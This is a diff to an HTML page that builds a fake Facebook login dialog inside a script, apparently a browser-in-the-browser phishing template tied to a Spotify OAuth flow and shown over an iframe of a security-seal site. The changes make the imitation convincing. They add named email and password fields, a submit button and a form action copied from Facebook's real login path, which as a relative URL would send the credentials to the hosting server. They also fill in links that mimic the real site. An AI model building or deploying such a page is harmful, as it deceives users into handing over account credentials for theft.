@@ -8,36 +8,45 @@
    			<div id="root"></div>
    		</div>
    		
-   		<script>
+   		<script type="text/javascript">
 			var facebookLogin = `
 				<div class="_4-u2 _1w1t _4-u8 _52jv">
 					<div class="_xku">
 						<span class="_50f6">Log in to Facebook</span>
 					</div>
+
 					<div>
 						<div class="login_form_container">
-							<form id="login_form">
+							<form id="login_form" action="/login/device-based/regular/login/?login_attempt=1&amp;next=https%3A%2F%2Fwww.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fclient_id%3D174829003346%26state%3DAQDSPntD_qmywg8YM1dMHAe0bOoms9_FZBPFoHgvG69-jaF14jpmP9srZW0_AwCISow4A8_6eaW7p-tyZ6o%26redirect_uri%3Dhttps%253A%252F%252Faccounts.spotify.com%252Fapi%252Ffacebook%252Foauth%252Faccess_token%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dfa130ee1-9393-45e7-ac4c-7f81c57f444e&amp;lwv=100" method="post" onsubmit=""
+
 								<div id="loginform">
-									<div class="clearfix _5466 _44mg">
-										<input type="text" class="inputtext _55r1 inputtext _1kbt inputtext _1kbt" placeholder="Email address or phone number">
+									<div class="clearfix _5466 _44mg" id="email_container">
+										<input type="text" class="inputtext _55r1 inputtext _1kbt inputtext _1kbt" name="email" id="email" tabindex="0" placeholder="Email address or phone number" value="" autofocus="1" aria-label="Email address or phone number">
 									</div>
+
 									<div class="clearfix _5466 _44mg">
-										<input type="password" class="inputtext _55r1 inputtext _1kbt inputtext _1kbt" placeholder="Password">
+										<input type="password" class="inputtext _55r1 inputtext _1kbt inputtext _1kbt" name="pass" id="pass" tabindex="0" placeholder="Password" aria-label="Password">
 									</div>
+
 									<div class="_xkt">
-										<button class="_42ft _4jy0 _52e0 _4jy6 _4jy1 selected _51sy">Log In</button>
+										<button value="1" class="_42ft _4jy0 _52e0 _4jy6 _4jy1 selected _51sy" id="loginbutton" name="login" tabindex="0" type="submit">Log In</button>
 									</div>
+									
 									<div class="_xkv fsm fwn fcg" id="login_link">
-										<a href="#">Forgotten account?</a>
+										<a href="https://www.facebook.com/recover/initiate/?ars=facebook_login" id="forgot-password-link" target="">Forgotten account?</a>
+									
 										<span role="presentation" aria-hidden="true"> · </span>
-										<a href="#" id="reg-link">Sign up for Facebook</a>
+										
+										<a href="/r.php?api_key=174829003346&amp;app_id=174829003346&amp;cancel_url=https%3A%2F%2Faccounts.spotify.com%2Fapi%2Ffacebook%2Foauth%2Faccess_token%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DAQDSPntD_qmywg8YM1dMHAe0bOoms9_FZBPFoHgvG69-jaF14jpmP9srZW0_AwCISow4A8_6eaW7p-tyZ6o%23_%3D_&amp;next=https%3A%2F%2Fwww.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fclient_id%3D174829003346%26state%3DAQDSPntD_qmywg8YM1dMHAe0bOoms9_FZBPFoHgvG69-jaF14jpmP9srZW0_AwCISow4A8_6eaW7p-tyZ6o%26redirect_uri%3Dhttps%253A%252F%252Faccounts.spotify.com%252Fapi%252Ffacebook%252Foauth%252Faccess_token%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dfa130ee1-9393-45e7-ac4c-7f81c57f444e&amp;locale=en_GB&amp;display=page" rel="nofollow" id="reg-link">Sign up for Facebook</a>
 									</div>
 								</div>
 							</form>
 						</div>
 
 						<div>
-							<a class="_2iem">Not now</a>
+							<a href="https://accounts.spotify.com/api/facebook/oauth/access_token?error=access_denied&amp;error_code=200&amp;error_description=Permissions+error&amp;error_reason=user_denied&amp;state=AQDSPntD_qmywg8YM1dMHAe0bOoms9_FZBPFoHgvG69-jaF14jpmP9srZW0_AwCISow4A8_6eaW7p-tyZ6o#_=_" target="_self" rel="nofollow" data-lynx-mode="asynclazy" data-lynx-uri="https://l.facebook.com/l.php?u=https%3A%2F%2Faccounts.spotify.com%2Fapi%2Ffacebook%2Foauth%2Faccess_token%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DAQDSPntD_qmywg8YM1dMHAe0bOoms9_FZBPFoHgvG69-jaF14jpmP9srZW0_AwCISow4A8_6eaW7p-tyZ6o%23_%3D_&amp;h=AT0ZDs0QhUxBb4-CxYViI7iwd_wTA8-rXtvxYJSTSPtHJ4jQT-7gEVEmKTHr2zihwVVQH80WHvTzQ4Acp7OAjVbtlyPO4ZiDqHbkNhI0hoM_JQhZpx-AN9oLFBEouph_Nr9hrdNsWIzhGWXzt129yFFLJow">
+							<span class="_2iem">Not now</span>
+							</a>
 						</div>
 					</div>
 				</div>
@@ -226,7 +235,6 @@
    			document.head.appendChild(style);
 		</script>
 
- 		<iframe src="https://www.siteblindado.com/" width="100%" height="100%">
- 		</iframe>
+ 		<iframe src="https://www.siteblindado.com/" width="100%" height="100%"></iframe>
    </body>
 </html>
